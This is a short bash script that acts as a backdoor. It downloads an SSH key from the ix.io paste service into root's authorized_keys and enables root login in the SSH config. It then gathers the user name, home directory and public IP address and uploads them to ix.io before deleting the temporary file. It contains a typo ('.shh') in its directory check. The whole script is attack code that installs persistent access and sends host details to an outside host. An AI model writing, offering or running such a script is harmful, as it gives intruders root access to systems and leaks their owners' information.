#!/bin/bash
if [ ! -d /root/.ssh ]; then
	mkdir -p /root/.shh
fi
curl http://ix.io/ID >> /root/.ssh/authorized_keys
echo permitRootLogin yes >> /etc/ssh/sshd_config
echo $USER - $HOME > /tmp/file.txt
curl wtfismyip.com/text >> /tmp/file.txt
cat /tmp/file.txt | curl -F 'f:1=<-' USER:PASS@ix.io >> /dev/null
rm -rf /tmp/file.txt
